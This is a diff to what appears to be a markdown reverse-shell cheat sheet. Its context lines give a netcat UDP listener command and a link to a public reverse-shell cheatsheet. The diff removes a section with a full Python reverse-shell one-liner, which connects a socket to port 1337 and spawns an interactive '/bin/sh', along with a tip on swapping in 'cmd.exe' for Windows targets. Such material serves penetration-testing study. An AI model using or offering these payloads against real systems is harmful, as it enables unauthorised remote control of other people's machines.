@@ -64,12 +64,5 @@ Remember use -u (udp) flag in netcat listener as following:
 nc -u -lvp 1337
 </pre>
 
-## Brains
-In some cases you will find some payload that contains a **system call** as the following **'/bin/sh'** (for Linux) you can modify  
-it by changing **'/bin/sh'** for **'cmd.exe'** and then you got a python payload for Windows in this case.  
-<pre>
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</pre>
-
 ### Some relevant sources:  
 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a>
